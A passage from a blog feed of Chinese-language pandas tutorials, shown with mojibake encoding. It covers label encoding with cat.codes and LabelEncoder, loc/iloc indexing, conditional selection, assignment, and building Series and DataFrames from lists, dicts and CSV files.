class="string">&#x27;Bridge_Types&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># converting type of columns to &#x27;category&#x27;</span></span><br><span class="line">bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>] = bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>].astype(<span class="string">&#x27;category&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assigning numerical values and storing in another column</span></span><br><span class="line">bridge_df[<span class="string">&#x27;Bridge_Types_Cat&#x27;</span>] = bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>].cat.codes</span><br><span class="line">bridge_df</span><br></pre></td></tr></table></figure><p>ä»£ç æç¤ºï¼š</p><ol type="1"><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œéæ•°å€¼å‹åˆ—æ˜¯ "object" ç±»å‹ï¼Œè¯¥æ–¹æ³•è¦æ±‚ç±»åˆ«åˆ—æ˜¯"category" ç±»å‹ï¼Œpandas é€šè¿‡ astype æ–¹æ³•è¿›è¡Œç±»å‹è½¬æ¢ã€‚</li><li>pandas.Series.cat æ˜¯ Accessor object for categorical properties ofthe Series valuesï¼Œè¿”å›ä¸€ä¸ª Categoricals ç±»å‹ã€‚Categoricals ç±»å‹æœ‰categories å’Œ codes å±æ€§ï¼Œåˆ†åˆ«è¡¨ç¤ºæ•°æ®å­˜å‚¨æ—¶çš„åˆ†ç±»å’Œç¼–ç ï¼Œç”¨æ³•:pandas.Categorical.categories ä¸ pandas.Categorical.codeã€‚</li></ol><h2 id="using-sci-kit-learn-library-approach">Using sci-kit learnlibrary approach</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"><span class="comment"># creating initial dataframe</span></span><br><span class="line">bridge_types = (<span class="string">&#x27;Arch&#x27;</span>,<span class="string">&#x27;Beam&#x27;</span>,<span class="string">&#x27;Truss&#x27;</span>,<span class="string">&#x27;Cantilever&#x27;</span>,<span class="string">&#x27;Tied Arch&#x27;</span>,<span class="string">&#x27;Suspension&#x27;</span>,<span class="string">&#x27;Cable&#x27;</span>)</span><br><span class="line">bridge_df = pd.DataFrame(bridge_types, columns=[<span class="string">&#x27;Bridge_Types&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># creating instance of labelencoder</span></span><br><span class="line">labelencoder = LabelEncoder()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Assigning numerical values and storing in another column</span></span><br><span class="line">bridge_df[<span class="string">&#x27;Bridge_Types_Cat&#x27;</span>] = labelencoder.fit_transform(bridge_df[<span class="string">&#x27;Bridge_Types&#x27;</span>])</span><br><span class="line">bridge_df</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220501233614.png"alt="bridge_df with categorical caolumn and label-encoded column values" /></p><h2 id="one-hot-encoding">One-Hot encoding</h2><p>Encoding is a required pre-processing step when working withcategorical data for machine learning algorithms. How to use ordinalencoding for categorical variables that have a natural rank ordering.How to use one-hot encoding for categorical variables that do not have anatural rank ordering.</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="https://towardsdatascience.com/categorical-encoding-using-label-encoding-and-one-hot-encoder-911ef77fb5bd">Categoricalencoding using Label-Encoding and One-Hot-Encoder | by Dinesh Yadav |Towards Data Science</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas ä¸­çš„ç´¢å¼•ä¸é€‰æ‹©</title>
      <link href="/blog/2022/05/19/ml/index_select_assign/"/>
      <url>/blog/2022/05/19/ml/index_select_assign/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>å°½ç®¡ç”¨æ¥é€‰æ‹©å’Œè®¾ç½®æ“ä½œçš„æ ‡å‡†çš„ Python/Numpyè¡¨è¾¾å¼éå¸¸æ–¹ä¾¿ï¼Œä½†æ˜¯å®˜æ–¹æ¨èä¼˜åŒ–çš„ pandas æ•°æ®è®¿é—®æ–¹æ³•<code>.at</code>,<code>.iat</code>, <code>.loc</code>, <code>.iloc</code>ã€‚</p><p>Pandas çš„æ•°æ®åŸºç¡€ç´¢å¼•æ–¹å¼ä¸»è¦åˆ†ä¸ºä¸¤ç§ï¼š Index-basedselectionï¼ˆindex,<code>iat</code>, <code>iloc</code>ï¼‰ï¼ŒLabel-basedselectionï¼ˆcolumn, <code>at</code>,<code>loc</code>ï¼‰ã€ï¼Œç¬¬ä¸‰ç§æ˜¯æ¡ä»¶ç´¢å¼• Conditional indexing/Booleanindexingï¼Œå³å‰ä¸¤ç§+å¸ƒå°”ç­‰å¼ã€ä¸ç­‰å¼å®ç°æ¡ä»¶ç´¢å¼•ã€‚</p><p><code>loc</code>å’Œ<code>iloc</code>çš„å¼‚åŒï¼ˆçœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼Œåé¢ä¼šè®²ï¼‰ï¼š</p><ol type="1"><li><p><code>loc</code> å’Œ <code>iloc</code> éƒ½æ˜¯row-firstï¼Œcolumn-second,è¿™æ„å‘³å– row æ¯”å– column å®¹æ˜“</p></li><li><p>åŒºé—´å¼€é—­</p><p><code>iloc</code> æ˜¯å¸¸è§çš„å‰é—­åå¼€ [a, b)ï¼Œ è€Œ<code>loc[a:b]</code><strong>é—­åŒºé—´[a, b]</strong></p></li></ol><h2 id="start">Start</h2><ol type="1"><li><p>é€‰æ‹©å•ç‹¬çš„ä¸€åˆ—ï¼Œä¼šç”Ÿæˆ Seriesï¼Œç›¸å½“äº <code>df.A</code></p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [8]: product</span><br><span class="line">Out[8]:</span><br><span class="line">Product A  Product B  Product C</span><br><span class="line">1         30         21          9</span><br><span class="line">2         35         34         10</span><br><span class="line">3         41         17         46</span><br><span class="line">4         43         12         75</span><br><span class="line">5         65         19         68</span><br><span class="line">6         13         10         32</span><br><span class="line"></span><br><span class="line">In [9]: product[&quot;Product A&quot;]</span><br><span class="line">Out[9]:</span><br><span class="line">1    30</span><br><span class="line">2    35</span><br><span class="line">3    41</span><br><span class="line">4    43</span><br><span class="line">5    65</span><br><span class="line">6    13</span><br><span class="line">Name: Product A, dtype: int64</span><br></pre></td></tr></table></figure></p></li><li><p>é€šè¿‡ <code>[]</code>,å¯ä»¥å¯¹ row åˆ‡ç‰‡ï¼š</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [10]: product[1:3]</span><br><span class="line">Out[10]:</span><br><span class="line">Product A  Product B  Product C</span><br><span class="line">2         35         34         10</span><br><span class="line">3         41         17         46</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="index-based-selection">Index-based selection</h2><p>æ— è®ºå¯¹äºé‚£ç§ selection, index éƒ½æ˜¯ numerical çš„ï¼ŒåŒºåˆ«åœ¨äº column æ˜¯numerical çš„ï¼Œè¿˜æ˜¯ labelã€‚</p><p><code>iloc</code>operator ï¼šindex-based selection: selecting databased on its numerical position in the data. <code>iloc</code> followsthis paradigmã€‚</p><p>æ³¨æ„ï¼š</p><ol type="1"><li>å¯¹äº <code>iloc</code> è€Œè¨€ï¼Œå–åˆ—å°±éœ€è¦æä¾›åˆ—çš„ numericindexersï¼Œæä¾› column label ä¾¿ä¼šæŠ¥é”™ã€‚</li><li>ç´¢å¼•åˆ‡ç‰‡çš„è§„åˆ™éƒ½å¯ä»¥ä½¿ç”¨ï¼šå‰é—­åå¼€çš„èŒƒå›´[),è´Ÿç´¢å¼• -1ï¼Œå…¨ç´¢å¼•ï¼šã€‚</li></ol><p>ç¤ºä¾‹ï¼ˆ<code>df</code> æ˜¯è¯»å–äº†æ•°æ®çš„åä¸º <code>df</code> çš„DataFrameï¼‰ï¼š</p><ul><li>å–å€’æ•°ç¬¬ä¸€è¡Œï¼š<code>df.iloc[-1]</code></li><li>å–ç¬¬ä¸€åˆ—ï¼š<code>df.iloc[:, 0]</code>, the <code>:</code> operatoråˆ‡ç‰‡æŒ‡æ‰€æœ‰å…ƒç´ ã€‚</li><li>å–ï¼š<code>reviews.iloc[[0, 1, 2], 0]</code></li></ul><h3 id="label-based-selection">Label-based selection</h3><p><code>loc</code> operator: label-basedselectionï¼Œå¯¹åˆ—è¿›è¡Œç´¢å¼•çš„æ—¶å€™ä½¿ç”¨ label/ç´¢å¼•çš„å€¼ï¼Œè€Œä¸æ˜¯ç´¢å¼•ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>å–ç¬¬ä¸€è¡Œ country åˆ—ï¼š<code>df.loc[0, 'country']</code>å–æ¯ä¸€è¡Œçš„'taster_name', 'taster_twitter_handle','points'ä¸‰åˆ—ï¼š<code>reviews.loc[:, ['taster_name', 'taster_twitter_handle', 'points']]</code></p><h2 id="loc-ä¸-iloc-å¼‚åŒ">loc ä¸ iloc å¼‚åŒ</h2><p><code>loc</code>å’Œ<code>iloc</code>çš„å¼‚åŒï¼š</p><ol type="1"><li><p><code>loc</code> å’Œ <code>iloc</code> éƒ½æ˜¯row-firstï¼Œcolumn-second,è¿™æ„å‘³å– row æ¯”å– column å®¹æ˜“</p></li><li><p>åŒºé—´å¼€é—­ <code>iloc</code> uses the Python stdlib indexingscheme,æ‰€ä»¥æ˜¯å¸¸è§çš„å‰é—­åå¼€ [a, b)ï¼Œ<code>[1,3]</code>,åˆ™æ˜¯<code>1 2</code> ä¸¤ä¸ªå…ƒç´ ã€‚</p><p>è€Œ<code>loc[a:b]</code> ä¸ºé—­åŒºé—´[a, b]ï¼Œ<code>[1, 3]</code>,åˆ™æ˜¯<code>1, 2, 3</code>ä¸‰ä¸ªå…ƒç´ ã€‚</p></li></ol><p>3.<code>iloc</code> ç›¸æ¯” <code>loc</code>å¤šåŠ çš„ <code>i</code>æ˜¯å³æ˜¯é’ˆå¯¹åˆ—ï¼Œä¹Ÿæ˜¯é’ˆå¯¹è¡Œçš„ï¼Œåªä¸è¿‡ index label æ¯”è¾ƒå°‘è§ã€‚</p><pre><code>è¡Œä¸€èˆ¬åªæœ‰ indexï¼Œè€Œ `loc`, `iloc` å¯¹è¡Œçš„ index éƒ½æ”¯æŒï¼Œå› æ­¤éƒ½å¯ã€‚å¦‚æœè¡Œæœ‰index labelï¼Œå¯ä½¿ç”¨ `loc`ã€‚åˆ—ä¸¤ç§ï¼šè¦ä½¿ç”¨ column number index é€‰æ‹©ï¼Œç”¨ `iloc`è¦ä½¿ç”¨ column labels é€‰æ‹©ï¼Œç”¨ `loc`</code></pre><ol start="4" type="1"><li><p><code>loc</code> å¯ä»¥ç´¢å¼•ä»»ä½• stdlib type: strings</p><p>å¦‚æœç´¢å¼•ï¼ˆé»˜è®¤å°±è¯´è¡Œç´¢å¼•ï¼‰çš„ç´¢å¼•å€¼ä¸º<code>Apples, ..., Potatoes, ...</code>ï¼Œåˆ™å¯ä»¥å²è¯¥ç´¢å¼•è¿›è¡Œåˆ‡ç‰‡ï¼Œ<code>df.loc['Apples':'Potatoes']</code>:allthe alphabetical fruit choices between Apples andPotatoes.å½“ç„¶ï¼Œæ­¤æ—¶é£Ÿç”¨</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [21]: df = pd.DataFrame(&#123;&#x27;Bob&#x27;: [&#x27;I liked it.&#x27;, &#x27;It was awful.&#x27;, &#x27;good.&#x27;, &#x27;very good&#x27;],</span><br><span class="line">    ...:                    &#x27;Sue&#x27;: [&#x27;Pretty good.&#x27;, &#x27;Bland.&#x27;, &#x27;Just so so&#x27;, &#x27;Bad.&#x27;]&#125;,</span><br><span class="line">    ...:                   index=[&#x27;Product A&#x27;, &#x27;Product B&#x27;, &quot;Product C&quot;,&quot;Product D&quot;])</span><br><span class="line">    ...: df.loc[&quot;Product B&quot;:&quot;Product C&quot;]</span><br><span class="line">Out[21]:</span><br><span class="line">                    Bob         Sue</span><br><span class="line">Product B  It was awful.      Bland.</span><br><span class="line">Product C          good.  Just so so</span><br><span class="line"></span><br><span class="line">...: df.iloc[1:3]</span><br><span class="line">Out[22]:</span><br><span class="line">                    Bob         Sue</span><br><span class="line">Product B  It was awful.      Bland.</span><br><span class="line">Product C          good.  Just so so</span><br></pre></td></tr></table></figure></p></li></ol><p><code>df.set_index("title")</code> å¯ä»¥æŠŠ title åˆ—è®¾ç½®æˆ label-basedindex</p><h2 id="conditional-selection">Conditional selection</h2><ol type="1"><li><p>reviews çš„ countryåˆ—æ˜¯å¦ç­‰äº'Italy'ï¼š<code>reviews.country == 'Italy'</code> è¿”å› a Seriesof True/False booleans based on the country of each record.</p></li><li><p>ä½¿ç”¨ä½ä¸ã€ä½æˆ–æ“ä½œç¬¦åœ¨ä¸¤ä¸ª bool è¡¨è¾¾å¼ä¹‹é—´</p></li></ol><p><code>reviews.loc[(reviews.country == 'Italy') &amp; (reviews.points &gt;= 90)]</code><code>reviews.loc[(reviews.country == 'Italy') | (reviews.points &gt;= 90)]</code></p><p>å†…ç½®é€‰æ‹©å™¨ï¼š<code>isin</code>ã€<code>isnull</code>ã€<code>notnull</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reviews.loc[reviews.country.isin([&#x27;Italy&#x27;, &#x27;France&#x27;])]</span><br><span class="line">reviews.loc[reviews.price.notnull()]</span><br></pre></td></tr></table></figure><h2 id="èµ‹å€¼">èµ‹å€¼</h2><p>å¯ä»¥èµ‹å•ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥èµ‹ä¸€ä¸ªåºåˆ—å€¼ï¼š</p><p><code>reviews['critic'] = 'everyone'</code>: å°† critic åˆ—çš„å€¼å…¨éƒ¨èµ‹ä¸ºeveryone<code>reviews['index_backwards'] = range(len(reviews), 0, -1)</code>:ä¸ºindex_backwards èµ‹äºˆä¸€ä¸ªé€†åºåˆ—å€¼ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://www.kaggle.com/code/residentmario/indexing-selecting-assigning#Manipulating-the-index">Indexing,Selecting &amp; Assigning | Kaggle</a></li><li><ahref="https://pandas.pydata.org/pandas-docs/stable/user_guide/10min.html#viewing-data">10minutes to pandas â€” pandas 1.4.2 documentation</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas å…¥é—¨</title>
      <link href="/blog/2022/05/18/ml/pandas_intro/"/>
      <url>/blog/2022/05/18/ml/pandas_intro/</url>
      
        <content type="html"><![CDATA[<h2 id="pandas-å…¥é—¨">Pandas å…¥é—¨</h2><p>Pandas ä¸­ä¸¤ä¸ªæ ¸å¿ƒå¯¹è±¡/æ•°æ®ç»“æ„ï¼š<code>DataFrame</code> å’Œ<code>Series</code>ï¼Œå…¶ä¸­<code>DataFrame</code>ä¸ºä¸»è¦æ•°æ®ç»“æ„ï¼Œå®ƒå¯ä»¥çœ‹åšæ˜¯<code>Series</code> å¯¹è±¡çš„ç±»å­—å…¸ç»“æ„çš„å®¹å™¨ã€‚<code>Series</code>æ˜¯æ•°å€¼çš„åºåˆ—ã€‚<code>DataFrame</code> æ˜¯å¸¦æœ‰ç´¢å¼•çš„ table-likeæ•°æ®ç»“æ„ï¼Œ<code>Series</code> æ˜¯å¸¦æœ‰ç´¢å¼•çš„ list-likeæ•°æ®ç»“æ„ï¼Œé€šè¿‡åˆ—è¡¨å³å¯åˆ› <code>Series</code>ï¼Œè€Œ <code>DataFrame</code>åˆ™éœ€è¦äºŒç»´çš„æ•°æ®ç»“æ„ï¼Œå¦‚ï¼šå­—å…¸ï¼Œå¤šç»´åˆ—è¡¨ç­‰åˆ›å»ºã€‚</p><p>å®‰è£…ï¼š<code>pip install pandas</code>å¯¼å…¥ï¼š<code>import pandas as pd</code></p><h2 id="series-åˆ›å»º">Series åˆ›å»º</h2><p>ä¸€ä¸ª Series å®é™…ä¸Šæ˜¯ DataFrame çš„ä¸€åˆ—ï¼Œè€Œä¸€ä¸ª DataFrameå®é™…ä¸Šå¯ä»¥çœ‹åšæ˜¯ç”±ä¸€ç³»åˆ— Series ç»„æˆã€‚é€šè¿‡ index å‚æ•°å¯ä»¥å¯¹ Seriesçš„åˆ—çš„ row ç´¢å¼•ï¼ˆå³ï¼šé€šè¿‡ index æŒ‡å®š rowlabelï¼‰ï¼Œä½†æ˜¯ç”±äºå…¶åªæœ‰ä¸€åˆ—ï¼Œæ‰€ä»¥æ²¡æœ‰èµ‹äºˆ column labelçš„æ„ä¹‰ä¸åŠŸã€‚è€Œæ˜¯å…¶æœ‰ä¸€ä¸ªæ•´ä½“çš„åå­—ï¼Œé€šè¿‡ <code>name</code> èµ‹å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># ä¸å¸¦ index, é»˜è®¤é€’å¢ç´¢å¼•</span><br><span class="line">In [2]: a_list = [1,2,3]</span><br><span class="line">   ...: pd.Series(a_list)</span><br><span class="line">Out[2]:</span><br><span class="line">0    1</span><br><span class="line">1    2</span><br><span class="line">2    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line"># å¸¦ index ç´¢å¼• row</span><br><span class="line">In [3]: a_list = [1,2,3]</span><br><span class="line">   ...: pd.Series(a_list, index=[&quot;2016 Sales&quot;, &quot;2017 Sales&quot;, &quot;2018 Sales&quot;])</span><br><span class="line">Out[3]:</span><br><span class="line">2016 Sales    1</span><br><span class="line">2017 Sales    2</span><br><span class="line">2018 Sales    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line"># å¸¦ index ï¼Œå¸¦ name</span><br><span class="line">In [7]: pd.Series(a_list, index=[&quot;2016 Sales&quot;, &quot;2017 Sales&quot;, &quot;2018 Sales&quot;], name=&quot;Production A&quot;)</span><br><span class="line">Out[7]:</span><br><span class="line">2016 Sales    1</span><br><span class="line">2017 Sales    2</span><br><span class="line">2018 Sales    3</span><br><span class="line">Name: Production A, dtype: int64</span><br></pre></td></tr></table></figure><h2 id="dataframe-çš„åˆ›å»º">DataFrame çš„åˆ›å»º</h2><p><code>class pandas.DataFrame(data=None, index=None, columns=None, dtype=None, copy=None)</code>Two-dimensional, size-mutable, potentially heterogeneous tabular dataäºŒç»´çš„æ•°æ®ç»“æ„ï¼Œå¤§å°å¯å˜ï¼Œå¯ä»¥å®¹çº³å¼‚æ„æ•°æ®</p><blockquote><ul><li><p>data: ndarray (structured or homogeneous), Iterable, dict, orDataFrame Dict can contain Series, arrays, constants, dataclass orlist-like objects. If data is a dict, column order followsinsertion-order. If a dict contains Series which have an index defined,it is aligned by its index.</p></li><li><p>index: The index (row labels) of the DataFrame.</p></li><li><p>columns: The column labels of the DataFrame.</p></li><li><p>dtype: Data type to force. Only a single dtype is allowed. IfNone, infer.</p></li></ul></blockquote><p>DataFrame å¯ä»¥ç”±å¾ˆå¤šæ•°æ®ç»“æ„åˆ›å»ºè€Œæ¥ï¼ŒåŸºç¡€çš„åˆ†åˆ«æœ‰ï¼šSeries,arrays,ndarray, constants, dataclass or list-like objectsã€‚</p><h3 id="ç”±æ–‡ä»¶è¯»å–">ç”±æ–‡ä»¶è¯»å–</h3><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸éœ€è¦æ‰‹åŠ¨åˆ›å»º DataFrame æˆ–Seriesï¼Œè€Œæ˜¯è¯»å–æ“ä½œç°æœ‰çš„æ•°æ®ï¼Œå¸¸è§æ•°æ®æ ¼å¼æœ‰ CSV</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [6]: product = pd.read_csv(&quot;./data/product.csv&quot;)</span><br><span class="line"></span><br><span class="line">In [7]: product</span><br><span class="line">Out[7]:</span><br><span class="line">   Unnamed: 0  Product A  Product B  Product C</span><br><span class="line">0           1         30         21          9</span><br><span class="line">1           2         35         34         10</span><br><span class="line">2           3         41         17         46</span><br><span class="line">3           4         43         12         75</span><br><span class="line">4           5         65         19         68</span><br><span class="line">5           6         13         10         32</span><br><span class="line"></span><br><span class="line">In [8]: product.shape</span><br><span class="line">Out[8]: (6, 4)</span><br></pre></td></tr></table></figure><p>å½“æ•°æ®é‡è¾ƒå¤§çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ <code>head(), tail()</code>æŸ¥çœ‹å‰äº”è¡Œæˆ–è€…åäº”è¡Œ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [9]: product.head</span><br><span class="line">Out[9]:</span><br><span class="line">&lt;bound method NDFrame.head of    Unnamed: 0  Product A  Product B  Product C</span><br><span class="line">0           1         30         21          9</span><br><span class="line">1           2         35         34         10</span><br><span class="line">2           3         41         17         46</span><br><span class="line">3           4         43         12         75</span><br><span class="line">4           5         65         19         68</span><br><span class="line">5           6         13         10         32&gt;</span><br><span class="line"></span><br><span class="line">In [11]: product.tail</span><br><span class="line">Out[11]:</span><br><span class="line">&lt;bound method NDFrame.tail of    Unnamed: 0  Product A  Product B  Product C</span><br><span class="line">0           1         30         21          9</span><br><span class="line">1           2         35         34         10</span><br><span class="line">2           3         41         17         46</span><br><span class="line">3           4         43         12         75</span><br><span class="line">4           5         65         19         68</span><br><span class="line">5           6         13         10         32&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° pandas ä¼šè‡ªåŠ¨ç”Ÿæˆç´¢å¼•ï¼Œå¦‚æœå¸Œæœ› pandasä½¿ç”¨æŸä¸€åˆ—ä½œä¸ºç´¢å¼•(è€Œä¸æ˜¯ä»å¤´åˆ›å»ºä¸€ä¸ªæ–°ç´¢å¼•)ï¼Œå¯ä»¥ä½¿ç”¨<code>index_col</code> æŒ‡å®šçŒå¾·ä½¿ç”¨ç¬¬ 0 è¡Œä½œä¸ºç´¢å¼•ã€‚</p><blockquote><p><code>index_col</code>: int, str, sequence of int / str, or False,optional, default None Column(s) to use as the row labels of the<code>DataFrame</code>, <strong>either given as string name or columnindex</strong>.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [12]: product = pd.read_csv(&quot;./data/product.csv&quot;, index_col=0)</span><br><span class="line"></span><br><span class="line">In [13]: product</span><br><span class="line">Out[13]:</span><br><span class="line">   Product A  Product B  Product C</span><br><span class="line">1         30         21          9</span><br><span class="line">2         35         34         10</span><br><span class="line">3         41         17         46</span><br><span class="line">4         43         12         75</span><br><span class="line">5         65         19         68</span><br><span class="line">6         13         10         32</span><br></pre></td></tr></table></figure><h3 id="å‘æ–‡ä»¶å†™å…¥">å‘æ–‡ä»¶å†™å…¥</h3><p><code>DataFrame.to_csv(file_name, sep=',', encoding='utf-8', index=)</code></p><p>å°† DataFrame å¯¹è±¡å†™å…¥é€—å·åˆ†éš”çš„ CSV æ–‡ä»¶ä¸­, file_nameå¿…é€‰å‚æ•°ï¼Œå…¶ä½™å¯é€‰ã€‚</p><blockquote><p><code>sep=','</code>: é»˜è®¤è¾“å‡ºæ–‡ä»¶ä»¥é€—å·åˆ†éš”ç¬¦,å¯ä»¥è‡ªè¡Œä¿®æ”¹ã€‚<code>encoding='utf-8'</code>: é»˜è®¤è¾“å‡ºæ–‡ä»¶ç¼–ç ä¸º utf-8ï¼Œå¯è‡ªè¡Œä¿®æ”¹<code>index=True</code>: é»˜è®¤å°†ç´¢å¼•ä¹Ÿå†™å…¥æ–‡ä»¶ï¼Œå¯ä»¥è®¾ç½®ä¸º Falseä¸å†™å…¥ç´¢å¼•ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">animals = pd.DataFrame(&#123;&#x27;Cows&#x27;: [12, 20], &#x27;Goats&#x27;: [22, 19]&#125;, index=[&#x27;Year 1&#x27;, &#x27;Year 2&#x27;])</span><br><span class="line">animals.to_csv(&quot;cows_and_goats.csv&quot;)</span><br></pre></td></tr></table></figure><h3 id="ç”±-dict-åˆ›å»º">ç”± Dict åˆ›å»º</h3><p>ç”±å­—å…¸åˆ›å»ºï¼Œå°†å­—å…¸å€¼èµ‹ç»™ columnlabelsï¼Œé»˜è®¤å¯¹ç´¢å¼•è¿›è¡Œé€’å¢ï¼ˆrowï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ index è‡ªå®šä¹‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 1. æ— è‡ªå®šä¹‰ indexï¼Œé»˜è®¤ç”Ÿæˆè‡ªç„¶æ•°ä½œä¸ºç´¢å¼•</span><br><span class="line">In [2]: pd.DataFrame(&#123;&#x27;Yes&#x27;: [50, 21], &#x27;No&#x27;: [131, 2]&#125;)</span><br><span class="line">Out[2]:</span><br><span class="line">   Yes   No</span><br><span class="line">0   50  131</span><br><span class="line">1   21    2</span><br><span class="line"></span><br><span class="line"># 2. è‡ªå®šä¹‰è¡Œ</span><br><span class="line">In [3]: pd.DataFrame(&#123;&#x27;Bob&#x27;: [&#x27;I liked it.&#x27;, &#x27;It was awful.&#x27;],</span><br><span class="line">                &#x27;Sue&#x27;: [&#x27;Pretty good.&#x27;, &#x27;Bland.&#x27;]&#125;,</span><br><span class="line">                index=[&#x27;Product A&#x27;, &#x27;Product B&#x27;])</span><br><span class="line">Out[3]:</span><br><span class="line">                Bob           Sue</span><br><span class="line">Product A    I liked it.  Pretty good.</span><br><span class="line">Product B  It was awful.        Bland.</span><br></pre></td></tr></table></figure><h3 id="ç”±åŒ…å«-series-çš„-dict-åˆ›å»º">ç”±åŒ…å« Series çš„ Dict åˆ›å»º</h3><p>å‰é¢è¯´åˆ° Series å¯ä»¥çœ‹åšå¸¦ç´¢å¼•çš„ List-like æ•°æ®ç»“æ„ï¼Œäºæ˜¯åŒ…å« Seriesçš„ Dict å’Œä¸€èˆ¬çš„åŒ…å« List çš„ Dict éƒ½å¯ä»¥åˆ›å»º 